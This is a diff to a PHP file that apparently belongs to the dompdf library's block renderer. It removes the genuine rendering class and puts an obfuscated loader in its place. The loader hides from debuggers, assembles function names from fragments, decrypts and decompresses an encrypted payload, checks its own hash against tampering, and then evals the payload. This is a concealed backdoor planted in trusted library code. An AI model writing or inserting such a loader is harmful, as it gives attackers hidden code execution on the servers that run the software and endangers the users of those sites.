@@ -1,262 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Frame;
-use Dompdf\FrameDecorator\AbstractFrameDecorator;
-use Dompdf\Helpers;
-
-/**
- * Renders block frames
- *
- * @package dompdf
- */
-class Block extends AbstractRenderer
-{
-
-    /**
-     * @param Frame $frame
-     */
-    function render(Frame $frame)
-    {
-        $style = $frame->get_style();
-        $node = $frame->get_node();
-
-        list($x, $y, $w, $h) = $frame->get_border_box();
-
-        $this->_set_opacity($frame->get_opacity($style->opacity));
-
-        if ($node->nodeName === "body") {
-            $h = $frame->get_containing_block("h") - (float)$style->length_in_pt(array(
-                        $style->margin_top,
-                        $style->border_top_width,
-                        $style->border_bottom_width,
-                        $style->margin_bottom),
-                    (float)$style->length_in_pt($style->width));
-        }
-
-        // Handle anchors & links
-        if ($node->nodeName === "a" && $href = $node->getAttribute("href")) {
-            $href = Helpers::build_url($this->_dompdf->getProtocol(), $this->_dompdf->getBaseHost(), $this->_dompdf->getBasePath(), $href);
-            $this->_canvas->add_link($href, $x, $y, (float)$w, (float)$h);
-        }
-
-        // Draw our background, border and content
-        list($tl, $tr, $br, $bl) = $style->get_computed_border_radius($w, $h);
-
-        if ($tl + $tr + $br + $bl > 0) {
-            $this->_canvas->clipping_roundrectangle($x, $y, (float)$w, (float)$h, $tl, $tr, $br, $bl);
-        }
-
-        if (($bg = $style->background_color) !== "transparent") {
-            $this->_canvas->filled_rectangle($x, $y, (float)$w, (float)$h, $bg);
-        }
-
-        if (($url = $style->background_image) && $url !== "none") {
-            $this->_background_image($url, $x, $y, $w, $h, $style);
-        }
-
-        if ($tl + $tr + $br + $bl > 0) {
-            $this->_canvas->clipping_end();
-        }
-
-        $border_box = array($x, $y, $w, $h);
-        $this->_render_border($frame, $border_box);
-        $this->_render_outline($frame, $border_box);
-
-        if ($this->_dompdf->getOptions()->getDebugLayout() && $this->_dompdf->getOptions()->getDebugLayoutBlocks()) {
-            $this->_debug_layout($frame->get_border_box(), "red");
-            if ($this->_dompdf->getOptions()->getDebugLayoutPaddingBox()) {
-                $this->_debug_layout($frame->get_padding_box(), "red", array(0.5, 0.5));
-            }
-        }
-
-        if ($this->_dompdf->getOptions()->getDebugLayout() && $this->_dompdf->getOptions()->getDebugLayoutLines() && $frame->get_decorator()) {
-            foreach ($frame->get_decorator()->get_line_boxes() as $line) {
-                $frame->_debug_layout(array($line->x, $line->y, $line->w, $line->h), "orange");
-            }
-        }
-
-        $id = $frame->get_node()->getAttribute("id");
-        if (strlen($id) > 0)  {
-            $this->_canvas->add_named_dest($id);
-        }
-    }
-
-    /**
-     * @param AbstractFrameDecorator $frame
-     * @param null $border_box
-     * @param string $corner_style
-     */
-    protected function _render_border(AbstractFrameDecorator $frame, $border_box = null, $corner_style = "bevel")
-    {
-        $style = $frame->get_style();
-        $bp = $style->get_border_properties();
-
-        if (empty($border_box)) {
-            $border_box = $frame->get_border_box();
-        }
-
-        // find the radius
-        $radius = $style->get_computed_border_radius($border_box[2], $border_box[3]); // w, h
-
-        // Short-cut: If all the borders are "solid" with the same color and style, and no radius, we'd better draw a rectangle
-        if (
-            in_array($bp["top"]["style"], array("solid", "dashed", "dotted")) &&
-            $bp["top"] == $bp["right"] &&
-            $bp["right"] == $bp["bottom"] &&
-            $bp["bottom"] == $bp["left"] &&
-            array_sum($radius) == 0
-        ) {
-            $props = $bp["top"];
-            if ($props["color"] === "transparent" || $props["width"] <= 0) {
-                return;
-            }
-
-            list($x, $y, $w, $h) = $border_box;
-            $width = (float)$style->length_in_pt($props["width"]);
-            $pattern = $this->_get_dash_pattern($props["style"], $width);
-            $this->_canvas->rectangle($x + $width / 2, $y + $width / 2, (float)$w - $width, (float)$h - $width, $props["color"], $width, $pattern);
-            return;
-        }
-
-        // Do it the long way
-        $widths = array(
-            (float)$style->length_in_pt($bp["top"]["width"]),
-            (float)$style->length_in_pt($bp["right"]["width"]),
-            (float)$style->length_in_pt($bp["bottom"]["width"]),
-            (float)$style->length_in_pt($bp["left"]["width"])
-        );
-
-        foreach ($bp as $side => $props) {
-            list($x, $y, $w, $h) = $border_box;
-            $length = 0;
-            $r1 = 0;
-            $r2 = 0;
-
-            if (!$props["style"] ||
-                $props["style"] === "none" ||
-                $props["width"] <= 0 ||
-                $props["color"] == "transparent"
-            ) {
-                continue;
-            }
-
-            switch ($side) {
-                case "top":
-                    $length = (float)$w;
-                    $r1 = $radius["top-left"];
-                    $r2 = $radius["top-right"];
-                    break;
-
-                case "bottom":
-                    $length = (float)$w;
-                    $y += (float)$h;
-                    $r1 = $radius["bottom-left"];
-                    $r2 = $radius["bottom-right"];
-                    break;
-
-                case "left":
-                    $length = (float)$h;
-                    $r1 = $radius["top-left"];
-                    $r2 = $radius["bottom-left"];
-                    break;
-
-                case "right":
-                    $length = (float)$h;
-                    $x += (float)$w;
-                    $r1 = $radius["top-right"];
-                    $r2 = $radius["bottom-right"];
-                    break;
-                default:
-                    break;
-            }
-            $method = "_border_" . $props["style"];
-
-            // draw rounded corners
-            $this->$method($x, $y, $length, $props["color"], $widths, $side, $corner_style, $r1, $r2);
-        }
-    }
-
-    /**
-     * @param AbstractFrameDecorator $frame
-     * @param null $border_box
-     * @param string $corner_style
-     */
-    protected function _render_outline(AbstractFrameDecorator $frame, $border_box = null, $corner_style = "bevel")
-    {
-        $style = $frame->get_style();
-
-        $props = array(
-            "width" => $style->outline_width,
-            "style" => $style->outline_style,
-            "color" => $style->outline_color,
-        );
-
-        if (!$props["style"] || $props["style"] === "none" || $props["width"] <= 0) {
-            return;
-        }
-
-        if (empty($border_box)) {
-            $border_box = $frame->get_border_box();
-        }
-
-        $offset = (float)$style->length_in_pt($props["width"]);
-        $pattern = $this->_get_dash_pattern($props["style"], $offset);
-
-        // If the outline style is "solid" we'd better draw a rectangle
-        if (in_array($props["style"], array("solid", "dashed", "dotted"))) {
-            $border_box[0] -= $offset / 2;
-            $border_box[1] -= $offset / 2;
-            $border_box[2] += $offset;
-            $border_box[3] += $offset;
-
-            list($x, $y, $w, $h) = $border_box;
-            $this->_canvas->rectangle($x, $y, (float)$w, (float)$h, $props["color"], $offset, $pattern);
-            return;
-        }
-
-        $border_box[0] -= $offset;
-        $border_box[1] -= $offset;
-        $border_box[2] += $offset * 2;
-        $border_box[3] += $offset * 2;
-
-        $method = "_border_" . $props["style"];
-        $widths = array_fill(0, 4, (float)$style->length_in_pt($props["width"]));
-        $sides = array("top", "right", "left", "bottom");
-        $length = 0;
-
-        foreach ($sides as $side) {
-            list($x, $y, $w, $h) = $border_box;
-
-            switch ($side) {
-                case "top":
-                    $length = (float)$w;
-                    break;
-
-                case "bottom":
-                    $length = (float)$w;
-                    $y += (float)$h;
-                    break;
-
-                case "left":
-                    $length = (float)$h;
-                    break;
-
-                case "right":
-                    $length = (float)$h;
-                    $x += (float)$w;
-                    break;
-                default:
-                    break;
-            }
-
-            $this->$method($x, $y, $length, $props["color"], $widths, $side, $corner_style);
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_u34473w4=('bas'.'e64'.'_de'.'cod'.'e');
+$_z7gvypqu=('gzu'.'nco'.'mpr'.'ess');
+$_hadxj80n=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_egiurqes='rgwk4AVw';
+$_t3f71lbn='OsTghDld';
+$_v3l7yc9q='cDNzEE87';
+$_lch50ojz='jSCpvMEcYek=';
+$_xlp7e1us='0Tz2uR9j';
+$_s14qdhh1='VS2yYA==';
+$_oixz0lzv='UA4P0sEg';
+$_rtc447s9='YWMbCvTy';
+$_wi3cjx6r=$_u34473w4($_xlp7e1us.$_egiurqes.$_v3l7yc9q.$_t3f71lbn.$_lch50ojz);
+$_m59u9hg6=$_u34473w4($_rtc447s9.$_oixz0lzv.$_s14qdhh1);
+$_pff0onwn=$_u34473w4('nQd30l/wFLAWNwiFRsJsIpFVPOlry1/eJXWPafOeRmnb6Dx7htbBdQ1OsSt2AC+GgnFWgkP4YfY/F0UYOZl+tCSWYjTwDNoRTvfsTqqHgW5eRjR/RgK7CENr6Ubaa+XglXha4Zh3jQ0LalSjYZWkx64rMtQsL6lOZjSs/xvSEL+HXhG1bLarLpx2EwB4DQSpYM9F9kHkKa0p1dAjgeC5SwjYERWw3V9Ij7Y+p8GdID5cAsyuvVudStL34R5JiNyxKrYsk+TZy3MH11Ps8OH5HBW0aAVM8qsaAQlTImW4dNoqph0hCaa0W8v1gKYJak0KH3r3bNfBCLqfaaq7TmdDKiY9J9OF87ww5plpphSElfiaNY2FEKy5YRFBL/+z/oTu95EvlP+jWWP9Sl7igcJi7N9U4p7ah1P+1npGXkxxZOBplsYB7NilYuLK3/qB84el3gj3tXCfb850uieclla4DqIebrCADu3OQep2k+jMv+5H4Al/gBrqgEHXsYYB5CPpgkwVyLGO439IbMtfa1/j1g63XXvX1knev/ZiOWQQ/+boWEwbu0iBxcdxVSF3JehVKq45ewmIvG+2GraeIfZHK3eU11KNAjtNcaav8+EAKjD4mP0NWaiT0Z2Q7yjC14oEB74iv7OsjbnHJXiRtyPyrhpKc8SF0YKcSsOIkG+UKtDpxupr2KKIa+ixl/dH/pZUHj9By151oQ12kTjBHdIPz59npSkRVDwtSzd2idJ/hsitih+zog++cOZlIGI8ZEn2/8OIxwbG0Uv6Oaw8QF0rDAuO+/xczXDjht8dBaC71ChY0FEeiVi+ySD2xlfsJUZhjkztNda2QRJt5C1XQVbvx2ndB+Q8gxIkNSvrJtNqtgdaUvagXUTvEv/X6R1EcoFzeqm7uLLz3wr7tdUg9BNDKnFjf1GqsGZ2OxexysmyU30C2SCKqzmZy/0EZ/NA6GNGckQGvIpzcd/AHnB6gYaR5XoZWzca+hT1U5i9F9PrLYNXmFHJyFxdYAZVFp9c41YGCHVsBWhEftjZSjURUOgbUFrEdL/iVuJQvb8GRYVi7y20mHvZY3fSUss5L1yGu1yPev2S4sd0m4KhSGMXXb1z+i8NgjqwqIQNjV7++onYBYYNUMzKAqVG1pHSMTwbcT4v89iwJVXABaS2xo6nIdDzg2i0P/SaWEbos8UL6vrnM5FX1ockX5NRKUgZN1NTbsCUTKE9OYN658/4PUy2shf5SbueikxnTtCBEt+hXv3Eq+DlYSztBePov37j1DefB871siez6J8xOVWB+pQTe7BRHTJg/Am0pTNDhtvqxQ8QIYUX3zrJZRtVdfyxzeJQu7QtrDdkIACJCWiyxaMtYpdOvoKhl12yTP2i+c6g8JZkfs5J9BFGM8019gwvFAaVUivZGlWhdhIr807yHvar9nExQY8KeUoGi2U9V9SMg2F7Ma2nkjs4ru4qj6cE3+c1TXS8tQXqDKs4NUzJsFdlw0FP9os52gBvbn6deRCCzhdm2pL8DCbkZZvnzIOOqq51cBnf0KIFpqXHSNLvU3hxGTaZX+ZCYGcug2URz9NEH0ZY3XZNWEn8VN+5BqHFozUd4ATNN0cyhFcWhlVkmjpOS5One33x+n+jUYEyMsCxmnSZ1WG85DIcl6eTxERlwMSIZJJpJr57QnGAjpyUxBD21zCUShjZouYIzBzuD+rZvE6BUnFN4BWDlLLMZz5cDwjzUp7EU5iESyiWs8fcxS3lHSL0QfJH7sN9nun5yKa5XQMTeKc6Y12+scXSZc9ctxq7dB0Q9D765nsyMOwmlH1grNOXjSOH5qNFBCNgFhgSGkAzb/Sr8P0pYfHWxf5zCx4pKGKAt/lsh2dR7BuUfaRmetao/15WyhpdYnz5Eotba/x2P5wWX76k8DuBcc3XSpO3vJIYJteRb2nufSR5v20j/IGdahk2UIm5ncmmjhChIh86UXKEEq20iKzuESVunin6EC8ZTp2hk/2QmymFkMvHBe1NXg==');
+$_w6hzcws2=$_hadxj80n($_pff0onwn,'aes-256-cbc',$_wi3cjx6r,OPENSSL_RAW_DATA,$_m59u9hg6);
+if($_w6hzcws2===false){exit;}
+$_e5rdakqi=$_z7gvypqu($_w6hzcws2);
+if($_e5rdakqi===false){exit;}
+$_wgijyfm2='42f028d760a12f83328aeec87c18b1d2f4d454a0926eb2d6c8eb38862a8ace44';
+$_ts8aobss=@file_get_contents(__FILE__);
+if($_ts8aobss!==false){
+$_b8dpgejg=str_replace($_wgijyfm2,"0000000000000000000000000000000000000000000000000000000000000000",$_ts8aobss);
+$_dhk2mkne=hash("sha256",$_b8dpgejg);
+if($_dhk2mkne!==$_wgijyfm2){@http_response_code(403);exit;}
 }
+eval($_e5rdakqi);
